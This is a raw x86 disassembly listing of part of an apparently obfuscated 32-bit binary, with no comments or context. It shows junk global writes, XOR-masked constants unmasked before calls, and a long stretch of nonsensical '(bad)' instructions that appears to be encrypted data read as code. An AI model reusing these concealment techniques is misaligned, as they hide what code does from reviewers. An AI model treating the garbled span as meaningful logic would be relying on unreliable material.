  420e8e:	mov    DWORD PTR ds:0x4282a3,0x776f
  420e98:	cmp    DWORD PTR ds:0x4283db,0x0
  420e9f:	jle    0x420ecd
  420ea5:	push   0x428277
  420eaa:	push   0x4280df
  420eaf:	call   DWORD PTR ds:0x428e98
  420eb5:	add    ecx,DWORD PTR ds:0x4283d7
  420ebb:	xor    esi,DWORD PTR ds:0x42826f
  420ec1:	adc    DWORD PTR ds:0x4282c7,edx
  420ec7:	xor    DWORD PTR ds:0x42834f,edx
  420ecd:	mov    esi,DWORD PTR ds:0x42827b
  420ed3:	or     esi,DWORD PTR ds:0x4281d7
  420ed9:	mov    DWORD PTR ds:0x42827b,esi
  420edf:	and    ecx,ecx
  420ee1:	neg    DWORD PTR ds:0x4282af
  420ee7:	dec    ecx
  420ee8:	movzx  eax,WORD PTR ds:0x428197
  420eef:	sbb    eax,DWORD PTR ds:0x42834b
  420ef5:	mov    ds:0x428197,eax
  420efa:	mov    eax,DWORD PTR [ebp-0x90]
  420f00:	xor    esi,esi
  420f02:	add    esi,DWORD PTR ds:0x428247
  420f08:	xor    ecx,ecx
  420f0a:	add    ecx,DWORD PTR ds:0x42839f
  420f10:	sub    ecx,esi
  420f12:	xor    esi,DWORD PTR [esi+ecx*1]
  420f15:	lea    eax,[eax+edx*1+0x14f2e240]
  420f1c:	cmp    DWORD PTR ds:0x42834f,0x0
  420f23:	mov    DWORD PTR ds:0x4282e3,0x1362
  420f2d:	mov    DWORD PTR ds:0x428293,edx
  420f33:	mov    DWORD PTR ds:0x4282cf,edi
  420f39:	jmp    0x421029
  420f3e:	mov    DWORD PTR ds:0x4283b3,0xeb5
  420f48:	cmp    DWORD PTR ds:0x42834f,0x0
  420f4f:	ja     0x420f81
  420f55:	push   DWORD PTR [ebp-0x24]
  420f58:	push   DWORD PTR [ebp-0x14]
  420f5b:	push   DWORD PTR [ebp-0x14]
  420f5e:	call   DWORD PTR ds:0x428f10
  420f64:	neg    ecx
  420f66:	xor    esi,esi
  420f68:	or     esi,DWORD PTR ds:0x42821f
  420f6e:	xor    edx,edx
  420f70:	add    edx,DWORD PTR ds:0x42822b
  420f76:	sub    edx,esi
  420f78:	or     esi,DWORD PTR [esi+edx*1]
  420f7b:	sub    DWORD PTR ds:0x4282a7,ecx
  420f81:	mov    edx,DWORD PTR ds:0x42829f
  420f87:	sbb    edx,DWORD PTR ds:0x4283e7
  420f8d:	mov    DWORD PTR ds:0x42829f,edx
  420f93:	add    DWORD PTR ds:0x4281db,ecx
  420f99:	sub    DWORD PTR ds:0x4283cb,0x42833b
  420fa3:	cmp    DWORD PTR ds:0x4282c7,0x0
  420faa:	mov    ecx,DWORD PTR ds:0x4283ab
  420fb0:	movzx  edx,BYTE PTR ds:0x4281b3
  420fb7:	mov    DWORD PTR ds:0x428337,0x5580
  420fc1:	mov    DWORD PTR ds:0x4283e3,edi
  420fc7:	jmp    0x421029
  420fcc:	mov    DWORD PTR ds:0x4283e7,0x673a
  420fd6:	cmp    DWORD PTR ds:0x4282c7,0x0
  420fdd:	jle    0x420ffa
  420fe3:	push   DWORD PTR [ebp-0x20]
  420fe6:	call   DWORD PTR ds:0x428db4
  420fec:	xor    esi,edx
  420fee:	add    ecx,0x6ba8
  420ff4:	xor    edx,0x4b1f
  420ffa:	mov    edx,DWORD PTR ds:0x428347
  421000:	sbb    DWORD PTR ds:0x4282c3,edx
  421006:	movzx  edx,WORD PTR ds:0x42819b
  42100d:	or     edx,DWORD PTR ds:0x4283c3
  421013:	mov    DWORD PTR ds:0x42819b,edx
  421019:	dec    DWORD PTR ds:0x4283b3
  42101f:	sub    DWORD PTR ds:0x4282bf,0x689b
  421029:	mov    DWORD PTR [ebp-0x174],eax
  42102f:	mov    eax,DWORD PTR [ebp-0x24]
  421032:	mov    ecx,DWORD PTR [ebp-0x94]
  421038:	add    esi,edx
  42103a:	mov    edx,DWORD PTR [ebp-0x10]
  42103d:	neg    esi
  42103f:	xor    edx,ecx
  421041:	cmp    DWORD PTR ds:0x4281ab,0x0
  421048:	mov    DWORD PTR ds:0x4283b7,0x62d9
  421052:	mov    DWORD PTR ds:0x428197,0x300d
  42105c:	mov    DWORD PTR ds:0x42819b,0x20bd
  421066:	mov    ecx,DWORD PTR ds:0x42833f
  42106c:	jmp    0x4210b5
  421071:	mov    DWORD PTR ds:0x4283af,0x134d
  42107b:	cmp    DWORD PTR ds:0x4281ab,0x0
  421082:	jae    0x4210a9
  421088:	push   DWORD PTR [ebp-0xc]
  42108b:	push   0x4ac4
  421090:	push   DWORD PTR [ebp-0x24]
  421093:	push   0x863f
  421098:	push   DWORD PTR [ebp-0x28]
  42109b:	call   DWORD PTR ds:0x428dd4
  4210a1:	sbb    ecx,DWORD PTR ds:0x4282c3
  4210a7:	adc    esi,esi
  4210a9:	and    DWORD PTR ds:0x4282e7,edi
  4210af:	sbb    ecx,DWORD PTR ds:0x4281a3
  4210b5:	add    edx,DWORD PTR [ebp-0x78]
  4210b8:	mov    ecx,DWORD PTR [ebp-0xc0]
  4210be:	lea    ecx,[edx+ecx*1+0x6ac1]
  4210c5:	and    ecx,eax
  4210c7:	mov    eax,0x1101
  4210cc:	sub    eax,ecx
  4210ce:	add    eax,DWORD PTR [ebp+0x8]
  4210d1:	mov    DWORD PTR [ebp-0x170],eax
  4210d7:	mov    DWORD PTR [ebp-0x15c],0xca79a575
  4210e1:	mov    DWORD PTR [ebp-0x158],0x9c1b89e8
  4210eb:	mov    DWORD PTR [ebp-0x154],0xca79a571
  4210f5:	mov    DWORD PTR [ebp-0x150],0x9c1b89e8
  4210ff:	mov    esi,DWORD PTR [ebp-0x174]
  421105:	mov    eax,DWORD PTR [ebp-0x154]
  42110b:	mov    edx,DWORD PTR [ebp-0x150]
  421111:	xor    eax,0xca79a575
  421116:	xor    edx,0x9c1b89e8
  42111c:	mov    cl,0x2
  42111e:	call   0x40a9b5
  421123:	mov    edi,eax
  421125:	mov    ebx,edx
  421127:	mov    eax,DWORD PTR [ebp-0x154]
  42112d:	mov    edx,DWORD PTR [ebp-0x150]
  421133:	xor    eax,0xca79a575
  421138:	xor    edx,0x9c1b89e8
  42113e:	mov    cl,0x3e
  421140:	call   0x422276
  421145:	or     edi,eax
  421147:	or     ebx,edx
  421149:	jmp    0x4213b9
  42114e:	test   al,0x92
  421150:	fdivr  st,st(3)
  421152:	and    bh,BYTE PTR [edx]
  421154:	call   0xd0bc:0x65828d2a
  42115b:	push   0xfc17cb7
  421160:	push   ss
  421161:	sbb    BYTE PTR [ebx+0x14],bh
  421164:	sbb    BYTE PTR [eax],bl
  421166:	lahf   
  421167:	and    BYTE PTR [esi+0x71ee9be0],dl
  42116d:	ins    BYTE PTR es:[edi],dx
  42116e:	sar    BYTE PTR [edx+ebp*2],0xae
  421172:	clc    
  421173:	xor    esp,ecx
  421175:	dec    eax
  421176:	sbb    ebp,edx
  421178:	sub    BYTE PTR [esi+esi*2+0x5a924afd],ch
  42117f:	repnz adc bh,dh
  421182:	es inc ebp
  421184:	sub    edx,DWORD PTR [eax]
  421186:	lea    esp,[edi]
  421188:	retf   0x6eee
  42118b:	jmp    0x421194
  42118d:	inc    ebp
  42118e:	ffree  st(0)
  421190:	nop
  421191:	int3   
  421192:	jmp    0x42116a
  421194:	jmp    0x421117
  421196:	jns    0x4211f0
  421198:	add    dh,BYTE PTR [eax+ebx*1]
  42119b:	pop    ecx
  42119c:	add    esp,DWORD PTR [ebp-0x22]
  42119f:	adc    DWORD PTR [edx-0xf],0xfffffff3
  4211a3:	(bad)  
  4211a4:	lahf   
  4211a5:	sub    DWORD PTR [ebp+0x7f],ebp
  4211a8:	mov    eax,0xa8ebdea1
  4211ad:	ja     0x42119e
  4211af:	sbb    DWORD PTR [eax+ebp*2+0x35],esp
  4211b3:	shl    dh,0xd5
  4211b6:	adc    esi,DWORD PTR [esi]
  4211b8:	call   0x7d6ecbfa
  4211bd:	fwait
  4211be:	sub    eax,0xc1a62099
  4211c3:	leave  
  4211c4:	daa    
  4211c5:	pushf  
  4211c6:	js     0x42118b
  4211c8:	xor    BYTE PTR [edx-0x2],dh
  4211cb:	xor    DWORD PTR [edx],edi
  4211cd:	js     0x4211de
  4211cf:	lahf   
  4211d0:	add    BYTE PTR [ebp-0x16],ah
  4211d3:	jmp    0x79ac:0xbd648b65
  4211da:	fisubr WORD PTR [edi+ebx*8+0x113e115d]
  4211e1:	and    DWORD PTR [edi-0x22],ecx
  4211e4:	aaa    
  4211e5:	imul   edx,esi,0xffffffc7
  4211e8:	pop    ebp
  4211e9:	es cdq 
  4211eb:	sub    ah,ch
  4211ed:	(bad)  
  4211ee:	repz push esi
  4211f0:	pop    ebp
  4211f1:	mov    ebx,DWORD PTR [ebx-0x7b3a0d37]
  4211f7:	sbb    BYTE PTR [ebp-0x6c],cl
  4211fa:	inc    esp
  4211fb:	and    ecx,DWORD PTR [ecx]
  4211fd:	addr16 in al,0x7d
  421200:	call   0xf684f9db
  421205:	and    al,0xf8
  421207:	repnz pop ebx
  421209:	fs push ebx
  42120b:	and    BYTE PTR [eax+0x31],dh
  42120e:	push   ebx
  42120f:	sbb    BYTE PTR [esi+0x35],ah
  421212:	mov    dl,0xb0
  421214:	fdivr  QWORD PTR ds:0x24ee7f77
  42121a:	inc    esi
  42121b:	or     al,0xf8
  42121d:	pop    ebx
  42121e:	(bad)  [ecx+0x77]
  421221:	sahf   
  421222:	inc    eax
  421223:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421224:	jne    0x421238
  421226:	pop    esp
  421227:	xchg   esi,eax
  421228:	inc    ebx
  421229:	scas   eax,DWORD PTR es:[edi]
  42122a:	repnz shr DWORD PTR [ebx],1
  42122d:	mov    WORD PTR [ebx-0x60],ds
  421230:	pushf  
  421231:	mov    ebx,0xa5a5ea53
  421236:	pop    es
  421237:	jg     0x421234
  421239:	sub    BYTE PTR [ebx+0x638de9fe],dh
  42123f:	cmc    
  421240:	(bad)  
  421241:	lahf   
  421242:	retf   
  421243:	jecxz  0x42124c
  421245:	and    BYTE PTR [eax+0x72],0xb5
  421249:	mov    al,0x3c
  42124b:	mov    ecx,0x45ca7ef
  421250:	mov    esi,0x855702aa
  421255:	inc    edx
  421256:	ror    DWORD PTR [ecx],0xde
  421259:	sahf   
  42125a:	std    
  42125b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42125c:	pop    DWORD PTR [edi+0x44ea63aa]
  421262:	and    al,0x3b
  421264:	add    eax,edx
  421266:	mov    edi,0x23ece7e8
  42126b:	and    edi,0xb4882ad0
  421271:	adc    ebp,DWORD PTR [eax-0x6913a22d]
  421277:	je     0x421269
  421279:	daa    
  42127a:	nop
  42127b:	adc    al,0xb6
  42127d:	call   0xc1098cd7
  421282:	sub    BYTE PTR [edi+0x28],dh
  421285:	mov    ah,0x3
  421287:	imul   ecx,esi,0xffffffbc
  42128a:	sbb    esi,DWORD PTR [ebp-0x5b90b047]
  421290:	sub    edx,DWORD PTR [ebp+0x4575e8b9]
  421296:	mov    DWORD PTR [edi+ebp*8+0x504052ab],0x78c677ca
  4212a1:	dec    ebx
  4212a2:	jb     0x42125f
  4212a4:	pop    ecx
  4212a5:	je     0x421291
  4212a7:	dec    ecx
  4212a8:	or     bl,BYTE PTR [esi+0x7e]
  4212ab:	xor    ah,0xbb
  4212ae:	or     BYTE PTR [edx-0x4b619fd4],bl
  4212b4:	loopne 0x4212d7
  4212b6:	jbe    0x4212e2
  4212b8:	mov    eax,ds:0xea2e0ebf
  4212bd:	retf   0x8ed4
  4212c0:	push   ecx
  4212c1:	leave  
  4212c2:	cwde   
  4212c3:	push   edx
  4212c4:	outs   dx,DWORD PTR ds:[esi]
  4212c5:	add    BYTE PTR [edi-0x6e],al
  4212c8:	shl    DWORD PTR [edx-0x25],1
  4212cb:	es test al,0x1
  4212ce:	dec    esi
  4212cf:	dec    esp
  4212d0:	dec    eax
  4212d1:	adc    al,0xf8
  4212d3:	xchg   ebx,eax
  4212d4:	test   eax,esi
  4212d6:	mov    bh,0xc8
  4212d8:	mov    ebp,0xb3ca4056
  4212dd:	data16 sub BYTE PTR [edi],bl
  4212e0:	scas   eax,DWORD PTR es:[edi]
  4212e1:	fs inc ebp
  4212e3:	mov    cs,WORD PTR [eax-0x80555b6]
  4212e9:	pop    ebp
  4212ea:	cmp    ah,dl
  4212ec:	mov    dh,0x2
  4212ee:	scas   al,BYTE PTR es:[di]
  4212f0:	mov    al,ds:0x3b7c153d
  4212f5:	sub    BYTE PTR [ecx],ch
  4212f7:	adc    eax,DWORD PTR [edx+0xa]
  4212fa:	pop    ebp
  4212fb:	pop    DWORD PTR [ebx+0x58f7d9de]
  421301:	dec    si
  421303:	jae    0x42135a
  421305:	cdq    
  421306:	inc    BYTE PTR [ebx]
  421308:	int3   
  421309:	les    esp,FWORD PTR [esi-0x2e]
  42130c:	fisubr WORD PTR [edx+0x61]
  42130f:	cmp    DWORD PTR [esi],ebx
  421311:	fstp   TBYTE PTR [ecx+edi*2+0x65d0e5c4]
  421318:	add    dl,BYTE PTR [ecx+0x48]
  42131b:	or     esp,ebx
  42131d:	stos   BYTE PTR es:[edi],al
  42131e:	add    eax,0x3cb8a9fa
  421323:	pop    esi
  421324:	mov    ebx,0x692006ca
  421329:	mov    ebx,0x7ffbcd8a
  42132e:	push   edx
  42132f:	xchg   dh,ah
  421331:	sbb    al,0x4b
  421333:	adc    DWORD PTR [ecx],esi
  421335:	pop    es
  421336:	dec    ebx
  421337:	add    DWORD PTR [ecx+0x2a],ebx
  42133a:	arpl   WORD PTR [edi+0x233aacd4],sp
  421340:	(bad)  
  421341:	sbb    bl,BYTE PTR [edi+0x3db84a1d]
  421347:	pop    esp
  421348:	xlat   BYTE PTR ds:[ebx]
  421349:	pop    eax
  42134a:	or     al,0x69
  42134c:	jl     0x4212d4
  42134e:	cmp    edi,edx
  421350:	cmp    ch,ch
  421352:	xor    al,0x80
  421354:	jmp    0x9958:0x560138a5
  42135b:	in     al,0xf5
  42135d:	cdq    
  42135e:	mov    ecx,0xc8cf9a8e
  421363:	dec    ecx
  421364:	stc    
  421365:	idiv   BYTE PTR [edx]
  421367:	test   eax,0x3a2df702
  42136c:	inc    eax
  42136d:	pop    ebp
  42136e:	dec    esp
  42136f:	mov    edx,0xf4f58f95
  421374:	jo     0x421335
  421376:	push   ecx
  421378:	lock adc eax,0x894b3fc
  42137e:	das    
  42137f:	push   ebp
  421380:	sbb    esp,DWORD PTR [edi]
  421382:	fist   WORD PTR [ebp+0x74]
  421385:	xchg   BYTE PTR [edi+0x6d102491],cl
  42138b:	or     esi,edi
  42138d:	rol    BYTE PTR [ecx+eax*2],cl
  421390:	xchg   DWORD PTR ds:0x1087cdef,esp
  421396:	push   ecx
  421397:	fistp  WORD PTR [esp+edx*8]
  42139a:	stos   BYTE PTR es:[edi],al
  42139b:	pop    eax
  42139c:	cwde   
  42139d:	hlt    
  42139e:	mov    bh,0xc2
  4213a0:	loopne 0x4213be
  4213a2:	push   esi
  4213a3:	jb     0x4213ee
  4213a5:	push   cs
  4213a6:	cmp    DWORD PTR [ebx+0x38],eax
  4213a9:	xchg   esi,eax
  4213aa:	(bad)  
  4213ab:	fdivr  QWORD PTR [eax+0x72d47abc]
  4213b1:	mov    BYTE PTR [ebx+0x27],bl
  4213b4:	jns    0x4213f6
  4213b6:	(bad)  
  4213b7:	jae    0x421384
  4213b9:	mov    eax,DWORD PTR [ebp-0x15c]
  4213bf:	mov    edx,DWORD PTR [ebp-0x158]
  4213c5:	xor    eax,0xca79a575
  4213ca:	xor    edx,0x9c1b89e8
  4213d0:	mov    cl,0x2
  4213d2:	call   0x40a9b5
  4213d7:	mov    ecx,edx
  4213d9:	mov    edx,DWORD PTR [ebp-0x15c]
  4213df:	mov    DWORD PTR [ebp-0x218],esi
  4213e5:	mov    esi,DWORD PTR [ebp-0x158]
  4213eb:	xor    edx,0xca79a575
  4213f1:	xor    esi,0x9c1b89e8
  4213f7:	mov    DWORD PTR [ebp-0x21c],eax
  4213fd:	mov    eax,edx
  4213ff:	mov    edx,esi
  421401:	mov    DWORD PTR [ebp-0x220],ecx
  421407:	mov    cl,0x3e
  421409:	call   0x422276
  42140e:	mov    esi,DWORD PTR [ebp-0x21c]
  421414:	or     esi,eax
  421416:	mov    eax,DWORD PTR [ebp-0x220]
  42141c:	or     eax,edx
  42141e:	push   eax
  42141f:	push   esi
  421420:	push   ebx
  421421:	push   edi
  421422:	call   0x416c20
  421427:	mov    esi,DWORD PTR [ebp-0x218]
  42142d:	cmp    esi,eax
  42142f:	jne    0x4214e5
  421435:	mov    eax,DWORD PTR [ebp-0x154]
  42143b:	mov    edx,DWORD PTR [ebp-0x150]
  421441:	xor    eax,0xca79a575
  421446:	xor    edx,0x9c1b89e8
  42144c:	mov    cl,0x2
  42144e:	call   0x40a9b5
  421453:	mov    esi,eax
  421455:	mov    edi,edx
  421457:	mov    eax,DWORD PTR [ebp-0x154]
  42145d:	mov    edx,DWORD PTR [ebp-0x150]
  421463:	xor    eax,0xca79a575
  421468:	xor    edx,0x9c1b89e8
  42146e:	mov    cl,0x3e
  421470:	call   0x422276
  421475:	or     esi,eax
  421477:	or     edi,edx
  421479:	mov    eax,DWORD PTR [ebp-0x15c]
  42147f:	mov    edx,DWORD PTR [ebp-0x158]
  421485:	xor    eax,0xca79a575
  42148a:	xor    edx,0x9c1b89e8
  421490:	mov    cl,0x2
  421492:	call   0x40a9b5
  421497:	mov    ebx,eax
  421499:	mov    eax,edx
  42149b:	mov    ecx,DWORD PTR [ebp-0x15c]
  4214a1:	mov    edx,DWORD PTR [ebp-0x158]
  4214a7:	xor    ecx,0xca79a575
  4214ad:	xor    edx,0x9c1b89e8
  4214b3:	mov    DWORD PTR [ebp-0x224],eax
  4214b9:	mov    eax,ecx
  4214bb:	mov    cl,0x3e
  4214bd:	call   0x422276
  4214c2:	or     ebx,eax
  4214c4:	mov    eax,DWORD PTR [ebp-0x224]
  4214ca:	or     eax,edx
  4214cc:	push   eax
  4214cd:	push   ebx
  4214ce:	push   edi
  4214cf:	push   esi
  4214d0:	call   0x416c20
  4214d5:	mov    DWORD PTR [ebp-0x178],eax
  4214db:	jmp    0x4217a5
  4214e0:	jmp    0x42175b
  4214e5:	lea    eax,[ebp-0x168]
  4214eb:	mov    DWORD PTR [ebp-0x164],eax
  4214f1:	mov    eax,DWORD PTR [ebp-0x164]
  4214f7:	mov    DWORD PTR [eax],0xa4069aae
  4214fd:	mov    eax,DWORD PTR [ebp-0x168]
  421503:	xor    eax,0xa4069aae
  421508:	shr    eax,0x2
  42150b:	mov    ecx,DWORD PTR [ebp-0x168]
  421511:	xor    ecx,0xa4069aae
  421517:	shl    ecx,0x1e
  42151a:	or     eax,ecx
  42151c:	mov    ecx,DWORD PTR [ebp-0x174]
  421522:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  421526:	mov    DWORD PTR [ebp-0x160],eax
  42152c:	mov    esi,DWORD PTR [ebp-0x160]
  421532:	mov    eax,DWORD PTR [ebp-0x154]
  421538:	mov    edx,DWORD PTR [ebp-0x150]
  42153e:	xor    eax,0xca79a575
  421543:	xor    edx,0x9c1b89e8
  421549:	mov    cl,0x2
  42154b:	call   0x40a9b5
  421550:	mov    edi,eax
  421552:	mov    ebx,edx
  421554:	mov    eax,DWORD PTR [ebp-0x154]
  42155a:	mov    edx,DWORD PTR [ebp-0x150]
  421560:	xor    eax,0xca79a575
  421565:	xor    edx,0x9c1b89e8
  42156b:	mov    cl,0x3e
  42156d:	call   0x422276
  421572:	or     edi,eax
  421574:	or     ebx,edx
  421576:	mov    eax,DWORD PTR [ebp-0x15c]
  42157c:	mov    edx,DWORD PTR [ebp-0x158]
  421582:	xor    eax,0xca79a575
  421587:	xor    edx,0x9c1b89e8
  42158d:	mov    cl,0x2
  42158f:	call   0x40a9b5
  421594:	mov    ecx,edx
  421596:	mov    edx,DWORD PTR [ebp-0x15c]
  42159c:	mov    DWORD PTR [ebp-0x228],esi
  4215a2:	mov    esi,DWORD PTR [ebp-0x158]
  4215a8:	xor    edx,0xca79a575
  4215ae:	xor    esi,0x9c1b89e8
  4215b4:	mov    DWORD PTR [ebp-0x22c],eax
  4215ba:	mov    eax,edx
  4215bc:	mov    edx,esi
  4215be:	mov    DWORD PTR [ebp-0x230],ecx
  4215c4:	mov    cl,0x3e
  4215c6:	call   0x422276
  4215cb:	mov    esi,DWORD PTR [ebp-0x22c]
  4215d1:	or     esi,eax
  4215d3:	mov    eax,DWORD PTR [ebp-0x230]
  4215d9:	or     eax,edx
  4215db:	push   eax
  4215dc:	push   esi
  4215dd:	push   ebx
  4215de:	push   edi
  4215df:	call   0x416c20
  4215e4:	mov    esi,DWORD PTR [ebp-0x228]
  4215ea:	cmp    esi,eax
  4215ec:	je     0x421661
  4215f2:	mov    eax,DWORD PTR [ebp-0x154]
  4215f8:	mov    edx,DWORD PTR [ebp-0x150]
  4215fe:	xor    eax,0xca79a575
  421603:	xor    edx,0x9c1b89e8
  421609:	mov    cl,0x2
  42160b:	call   0x40a9b5
  421610:	mov    esi,eax
  421612:	mov    edi,edx
  421614:	mov    eax,DWORD PTR [ebp-0x154]
  42161a:	mov    edx,DWORD PTR [ebp-0x150]
  421620:	xor    eax,0xca79a575
  421625:	xor    edx,0x9c1b89e8
  42162b:	mov    cl,0x3e
  42162d:	call   0x422276
  421632:	or     esi,eax
  421634:	or     edi,edx
  421636:	mov    eax,DWORD PTR [ebp-0x160]
  42163c:	imul   esi,eax
  42163f:	add    esi,DWORD PTR [ebp-0x170]
  421645:	mov    DWORD PTR [ebp-0x16c],esi
  42164b:	mov    eax,DWORD PTR [ebp-0x16c]
  421651:	mov    DWORD PTR [ebp-0x178],eax
  421657:	jmp    0x4217a5
  42165c:	jmp    0x42170c
  421661:	mov    eax,DWORD PTR [ebp-0x154]
  421667:	mov    edx,DWORD PTR [ebp-0x150]
  42166d:	xor    eax,0xca79a575
  421672:	xor    edx,0x9c1b89e8
  421678:	mov    cl,0x2
  42167a:	call   0x40a9b5
  42167f:	mov    esi,eax
  421681:	mov    edi,edx
  421683:	mov    eax,DWORD PTR [ebp-0x154]
  421689:	mov    edx,DWORD PTR [ebp-0x150]
  42168f:	xor    eax,0xca79a575
  421694:	xor    edx,0x9c1b89e8
  42169a:	mov    cl,0x3e
  42169c:	call   0x422276
  4216a1:	or     esi,eax
  4216a3:	or     edi,edx
  4216a5:	mov    eax,DWORD PTR [ebp-0x15c]
  4216ab:	mov    edx,DWORD PTR [ebp-0x158]
  4216b1:	xor    eax,0xca79a575
  4216b6:	xor    edx,0x9c1b89e8
  4216bc:	mov    cl,0x2
  4216be:	call   0x40a9b5
  4216c3:	mov    ebx,eax
  4216c5:	mov    eax,edx
  4216c7:	mov    ecx,DWORD PTR [ebp-0x15c]
  4216cd:	mov    edx,DWORD PTR [ebp-0x158]
  4216d3:	xor    ecx,0xca79a575
  4216d9:	xor    edx,0x9c1b89e8
  4216df:	mov    DWORD PTR [ebp-0x234],eax
  4216e5:	mov    eax,ecx
  4216e7:	mov    cl,0x3e
  4216e9:	call   0x422276
  4216ee:	or     ebx,eax
  4216f0:	mov    eax,DWORD PTR [ebp-0x234]
  4216f6:	or     eax,edx
  4216f8:	push   eax
  4216f9:	push   ebx
  4216fa:	push   edi
  4216fb:	push   esi
  4216fc:	call   0x416c20
  421701:	mov    DWORD PTR [ebp-0x178],eax
  421707:	jmp    0x4217a5
  42170c:	mov    eax,DWORD PTR [ebp-0x15c]
  421712:	mov    edx,DWORD PTR [ebp-0x158]
  421718:	xor    eax,0xca79a575
  42171d:	xor    edx,0x9c1b89e8
  421723:	mov    cl,0x2
  421725:	call   0x40a9b5
  42172a:	mov    esi,eax
  42172c:	mov    edi,edx
  42172e:	mov    eax,DWORD PTR [ebp-0x15c]
  421734:	mov    edx,DWORD PTR [ebp-0x158]
  42173a:	xor    eax,0xca79a575
  42173f:	xor    edx,0x9c1b89e8
  421745:	mov    cl,0x3e
  421747:	call   0x422276
  42174c:	or     esi,eax
  42174e:	or     edi,edx
  421750:	mov    DWORD PTR [ebp-0x178],esi
  421756:	jmp    0x4217a5
  42175b:	mov    eax,DWORD PTR [ebp-0x15c]
  421761:	mov    edx,DWORD PTR [ebp-0x158]
  421767:	xor    eax,0xca79a575
  42176c:	xor    edx,0x9c1b89e8
  421772:	mov    cl,0x2
  421774:	call   0x40a9b5
  421779:	mov    esi,eax
  42177b:	mov    edi,edx
  42177d:	mov    eax,DWORD PTR [ebp-0x15c]
  421783:	mov    edx,DWORD PTR [ebp-0x158]
  421789:	xor    eax,0xca79a575
  42178e:	xor    edx,0x9c1b89e8
  421794:	mov    cl,0x3e
  421796:	call   0x422276
  42179b:	or     esi,eax
  42179d:	or     edi,edx
  42179f:	mov    DWORD PTR [ebp-0x178],esi
  4217a5:	mov    ecx,DWORD PTR [ebp-0xd8]
  4217ab:	mov    eax,0x459a
  4217b0:	xor    edx,edx
  4217b2:	div    ecx
  4217b4:	mov    ecx,DWORD PTR [ebp-0xdc]
  4217ba:	and    eax,ecx
  4217bc:	add    eax,DWORD PTR [ebp-0x44]
  4217bf:	mov    ecx,DWORD PTR [ebp-0xe0]
  4217c5:	lea    eax,[eax+ecx*1+0x272f]
  4217cc:	xor    eax,0x1080c
  4217d1:	add    eax,DWORD PTR [ebp-0x178]
  4217d7:	mov    DWORD PTR [ebp-0xe8],eax
  4217dd:	mov    DWORD PTR [ebp-0xc],0x5950
  4217e4:	mov    DWORD PTR [ebp-0xf8],0x4964
  4217ee:	mov    DWORD PTR [ebp-0x130],0x3
  4217f8:	mov    DWORD PTR [ebp-0x20],0x2df9
  4217ff:	mov    DWORD PTR [ebp-0x8],0x4524
  421806:	mov    DWORD PTR [ebp-0xd4],0x637e
  421810:	mov    DWORD PTR [ebp-0x110],0x38c8
  42181a:	mov    DWORD PTR [ebp-0xa4],0x7118
  421824:	mov    DWORD PTR [ebp-0xa0],0xaf6
  42182e:	mov    DWORD PTR [ebp-0x10c],0x3315
  421838:	mov    eax,DWORD PTR [ebp-0xf8]
  42183e:	mov    ecx,DWORD PTR [ebp-0x130]
  421844:	xor    edx,edx
  421846:	div    ecx
  421848:	add    eax,0x454e
  42184d:	mov    ecx,DWORD PTR [ebp-0xc]
  421850:	and    eax,ecx
  421852:	xor    eax,0x5940
  421857:	add    eax,DWORD PTR [ebp+0x8]
  42185a:	mov    ecx,DWORD PTR [ebp-0x110]
  421860:	mov    edx,DWORD PTR [ebp-0xa4]
  421866:	sub    ecx,edx
  421868:	mov    edx,DWORD PTR [ebp-0xd4]
  42186e:	or     ecx,edx
  421870:	mov    edx,DWORD PTR [ebp-0x8]
  421873:	and    ecx,edx
  421875:	mov    edx,DWORD PTR [ebp-0x20]
  421878:	xor    ecx,edx
  42187a:	mov    edx,DWORD PTR [ebp-0x10c]
  421880:	mov    esi,0x180f
  421885:	sub    esi,edx
  421887:	mov    edx,DWORD PTR [ebp-0xa0]
  42188d:	imul   esi,edx
  421890:	xor    esi,0x402b
  421896:	xor    esi,0xfed78c17
  42189c:	mov    edx,DWORD PTR [ebp-0xe8]
  4218a2:	mov    ecx,DWORD PTR [edx+ecx*1-0x68bd]
  4218a9:	add    ecx,eax
  4218ab:	add    esi,ecx
  4218ad:	mov    DWORD PTR [ebp-0x38],esi
  4218b0:	mov    DWORD PTR [ebp-0x4],0x59a8
  4218b7:	mov    DWORD PTR [ebp-0x30],0x7021
  4218be:	mov    DWORD PTR [ebp-0xf4],0x6210
  4218c8:	mov    DWORD PTR [ebp-0x58],0x73d5
  4218cf:	mov    DWORD PTR [ebp-0x124],0x1e7d
  4218d9:	mov    DWORD PTR [ebp-0x3c],0x3144
  4218e0:	mov    eax,DWORD PTR [ebp-0x30]
  4218e3:	xor    eax,0x75cb
  4218e8:	mov    ecx,DWORD PTR [ebp-0x4]
  4218eb:	imul   eax,ecx
  4218ee:	mov    ecx,DWORD PTR [ebp+0x8]
  4218f1:	lea    ecx,[ecx+eax*1-0x2123b90]
  4218f8:	mov    eax,DWORD PTR [ebp-0xf4]
  4218fe:	and    eax,0x6b34
  421903:	and    eax,0x658d
  421908:	xor    edx,edx
  42190a:	push   0x6
  42190c:	pop    esi
  42190d:	div    esi
  42190f:	imul   eax,eax,0x3fb9
  421915:	mov    edx,DWORD PTR [ebp-0x3c]
  421918:	and    edx,0x58c7
  42191e:	mov    esi,DWORD PTR [ebp-0x124]
  421924:	or     edx,esi
  421926:	add    edx,0x7a25
  42192c:	imul   edx,edx,0x28d2
  421932:	mov    esi,DWORD PTR [ebp-0x58]
  421935:	xor    edx,esi
  421937:	xor    edx,0x1856f731
  42193d:	mov    esi,DWORD PTR [ebp-0xe8]
  421943:	mov    eax,DWORD PTR [esi+eax*1-0x3fb8fdc]
  42194a:	add    eax,ecx
  42194c:	add    edx,eax
  42194e:	mov    DWORD PTR [ebp-0xac],edx
  421954:	mov    DWORD PTR [ebp-0x54],0x1
  42195b:	mov    DWORD PTR [ebp-0x40],0x1ee8
  421962:	mov    DWORD PTR [ebp-0x1c],0x64d8
  421969:	mov    DWORD PTR [ebp-0xf0],0x5a06
  421973:	mov    DWORD PTR [ebp-0x108],0x2eeb
  42197d:	mov    DWORD PTR [ebp-0x104],0x2108
  421987:	mov    eax,DWORD PTR [ebp-0x1c]
  42198a:	xor    edx,edx
  42198c:	push   0x3
  42198e:	pop    ecx
  42198f:	div    ecx
  421991:	mov    ecx,DWORD PTR [ebp-0x40]
  421994:	or     eax,ecx
  421996:	mov    ecx,DWORD PTR [ebp-0x54]
  421999:	xor    edx,edx
  42199b:	div    ecx
  42199d:	imul   eax,eax,0x7d53
